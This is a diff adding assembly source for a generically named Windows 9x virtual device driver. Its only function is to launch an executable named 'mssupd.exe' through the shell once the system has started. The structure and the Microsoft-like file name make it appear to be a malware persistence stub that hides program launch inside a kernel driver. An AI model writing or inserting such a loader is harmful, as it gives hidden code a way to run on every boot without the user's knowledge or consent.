@@ -1,0 +1,49 @@
+.386p
+
+.XLIST
+INCLUDE vmm.inc
+INCLUDE shell.inc
+.LIST
+
+
+VXXXD_INIT_ORDER EQU SHELL_INIT_ORDER + 10
+
+Declare_Virtual_Device VXXXD, 4, 0, VXXXD_Control,\
+                       0, VXXXD_INIT_ORDER, ,
+
+VxD_LOCKED_CODE_SEG
+
+BeginProc    VXXXD_Control
+             Control_Dispatch  Device_Init,  DeviceInit
+             clc
+             ret
+EndProc      VXXXD_Control
+
+BeginProc    DeviceInit
+             VxDcall  _SHELL_CallAtAppyTime, <OFFSET32 AppyTimeCallback, 0, 0, 0>
+             clc                       ; no error - load VxD
+             ret
+EndProc      DeviceInit
+
+BeginProc    AppyTimeCallback
+             VxDcall  _SHELL_ShellExecute, <OFFSET32 ShPacket>
+             ret
+EndProc      AppyTimeCallback
+
+
+VxD_LOCKED_CODE_ENDS
+
+
+VxD_LOCKED_DATA_SEG
+ShPacket     DD    32+12
+             DD    32
+             DD    0
+             DD    32
+             DD    0
+             DD    0
+             DD    0
+             DD    0
+             DB    'mssupd.exe',0
+VxD_LOCKED_DATA_ENDS
+
+             END
